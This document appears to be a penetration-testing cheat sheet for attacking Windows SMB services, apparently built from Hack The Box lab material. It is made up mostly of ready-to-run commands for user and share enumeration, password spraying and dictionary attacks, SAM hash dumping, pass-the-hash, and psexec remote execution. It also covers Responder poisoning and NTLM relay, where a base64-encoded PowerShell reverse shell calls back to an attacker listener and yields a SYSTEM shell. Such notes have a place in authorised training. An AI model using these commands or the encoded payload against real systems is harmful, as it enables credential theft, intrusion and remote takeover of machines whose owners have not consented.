*Tools to Interact with this service: smbclient, nxc, SMBMap, Impacket, psexec.py, smbexec.py*
#### [Cheat Sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
# Enum4Linux-ng - Enumeration
```bash
enum4linux-ng $target -A -C
# listar usuarios
enum4linux-ng -U $target
# listar recursos compartidos (_shares_)
enum4linux-ng -S $target
# información del sistema operativo y dominio
enum4linux-ng -O $target

enum4linux-ng -u "usuario" -p "contraseña" $target
```
# Smbclient
``` bash
smbclient -L //$target/
smbclient -N -L //$target/
smbclient [-U|--user=[DOMAIN/]USERNAME%[PASSWORD]] -L //$target/
smbclient -U Caroline.Robinson%Marcos123! -L //$target 
smbclient -U jason%'34c8zuNBo91!@28Bszh' //$target/GGJ
smbclient -U user //$target/SHARE
smbclient -U '%' -N //$target/SHARE
```
- `-N`: It explicitly tells `smbclient` not to attempt to prompt for a password via the keyboard, forcing an anonymous connection.
- `-L`: This option allows you to look at what services are available on a server.
- `-U '%'`: The username is nothing (empty)
# NMAP
```bash
nmap --script smb-enum-shares -p 445 $target
```
# Netexec
```shell
nxc smb $target -u '' -p '' --shares
nxc smb $target -u "Caroline.Robinson" -p "Marcos123" --shares
nxc smb $target -u mendres -p 'Inlanefreight2025!' --spider SHARE --content --pattern "passw"

nxc smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
#**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

# Enumerating Logged-on Users
nxc smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
# Extract Hashes from SAM Database
nxc smb 10.10.110.17 -u administrator -p 'Password123!' --sam
# Pass-the-Hash (PtH)
nxc smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
# RPCclient
Remote Procedure Call (RPC)
```shell
rpcclient -U "" -N $target
rpcclient -U'%' $target
```

```shell
MarcosV999@htb[/htb]$ rpcclient -U "" $target

Enter WORKGROUP\'s password:
rpcclient $>
```

| **Query**                 | **Description**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |
#### Rpcclient - User Enumeration
```shell
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]

rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
```
#### Brute Forcing User RIDs - Bash
```shell
MarcosV999@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" $target -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
        
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
```
#### Brute Forcing User RIDs - Impacket - Samrdump.py
```shell
MarcosV999@htb[/htb]$ samrdump.py $target

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Retrieving endpoint list from 10.129.14.128
Found domain(s):
 . DEVSMB
 . Builtin
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
```
#### RPC
In the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:
- Change a user's password.
- Create a new domain user.
- Create a new shared folder.
We also cover enumeration using RPC in the [Active Directory Enumeration & Attacks module](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).
# SMBmap
```shell
MarcosV999@htb[/htb]$ smbmap -H $target --no-banner

[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS

MarcosV999@htb[/htb]$ smbmap -H $target -r SHARE
MarcosV999@htb[/htb]$ smbmap -H $target --download "SHARE\note.txt"
MarcosV999@htb[/htb]$ smbmap -H $target --upload test.txt "SHARE\test.txt"
```

# Windows - cmd
```powershell
C:\htb> dir \\192.168.220.129\Finance\
# The command 'net use' connects a computer from a shared resource.
C:\htb> net use n: \\192.168.220.129\Finance
# We can also provide a username and password to authenticate to the share.
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
# We can found total files
C:\htb> dir n: /a-d /s /b | find /c ":\"
```

With `dir` we can search for specific names in files such as: cred, password, users, secrets, key, Common File Extensions

```powershell
C:\htb>dir n:\*cred* /s /b
C:\htb>dir n:\*secret* /s /b
# If we want to search for a specific word within a text file, we can use findstr.
c:\htb>findstr /s /i cred n:\*.*
```
# Windows - powershell

```powershell
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\
# Instead of net use, we can use New-PSDrive in PowerShell.
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
# PSCredential Object
PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
# In PowerShell, we can use the command Get-ChildItem or the short variant gci instead of the command dir.
PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
# We can use the property `-Include` to find specific items from the directory specified by the Path parameter.
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
# The Select-String cmdlet uses regular expression matching to search for text patterns in input strings and files.
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```
# Linux
Linux (UNIX) machines can also be used to browse and mount SMB shares
```bash
MarcosV999@htb[/htb]$ sudo mkdir /mnt/Finance
MarcosV999@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```
Note: We need to install `cifs-utils` to connect to an SMB share folder.

```bash
MarcosV999@htb[/htb]$ find /mnt/Finance/ -name *cred*
MarcosV999@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred
```
# Password attack

```bash
# dictionary attack 
use auxiliary/scanner/smb/smb_login 
set RHOSTS <IP_OBJETIVO> 
set SMBUser jason 
set PASS_FILE /ruta/a/rockyou.txt run

hydra -l 'jason' -P $rockyou $target smb2
nxc smb $target -u 'jason' -p $rockyou --ignore-pw-decoding

# password spray
MarcosV999@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

# Remote Code Execution (RCE)
We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:
- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described [here](https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access). This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

```
MarcosV999@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

# Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).
The most common tool to perform such operations is the `Responder`
Imagine we created a fake SMB server using the Responder default configuration, with the following command:
```
MarcosV999@htb[/htb]$ responder -I <interface name>
```
Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

```
MarcosV999@htb[/htb]$ sudo responder -I ens33
```
These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.
*All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.*
```
MarcosV999@htb[/htb]$ hashcat -m 5600 hash.txt $rockyou
```
If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.
First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).
```
MarcosV999@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```
Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.
```
MarcosV999@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).
```
MarcosV999@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```
Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
```
MarcosV999@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```
